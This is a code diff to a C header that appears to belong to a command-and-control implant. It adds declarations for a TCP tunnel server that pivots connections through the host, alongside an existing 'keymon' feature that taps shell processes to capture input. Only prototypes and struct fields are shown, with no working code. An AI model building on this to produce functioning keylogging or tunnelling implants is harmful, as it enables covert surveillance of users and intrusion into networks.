@@ -36,6 +36,9 @@
   #include <curl/curl.h>
   #include <sys/select.h>
   #include <linux/input.h>
+  #include <netdb.h>
+  #include <arpa/inet.h>
+  #include <sys/socket.h>
 #endif
 
 // A struct for tracking session info.
@@ -45,6 +48,7 @@ typedef struct{
   unsigned long delay; // Callback delay, in seconds.
   char *write_dir; // Full path to a writable directory.
   unsigned short abort; // Will be set to 1 if session need to be ended.
+  queue *tasks; // Running tasks.
 } session;
 
 // A struct for representing a single task.
@@ -54,6 +58,7 @@ typedef struct{
   cJSON *data; // The data needed by the task
   unsigned short completed; // Indicates if the task has been completed.
   unsigned short successful; // Indicates if the task was successfully completed.
+  unsigned short abort; // For long-running tasks. Indicates if they should abort.
   cJSON *result; // The result of the task.
   cJSON *input_json; // The cJSON object used to generate the task.
 } task;
@@ -114,6 +119,16 @@ void *keymon_proc_watch(void *ptr);
 
 // Called by keymon in bg thread for every shell process to be tapped.
 void *keymon_proc_attach(void *ptr);
+
+// Starts a TCP tunnel server.
+int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport);
+
+// Create a TCP tunnel for a new connection.
+#ifdef IS_LINUX
+  void *tcp_tunnel_route(void *ptr);
+#else
+  DWORD WINAPI tcp_tunnel_route(LPVOID ptr);
+#endif
 
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
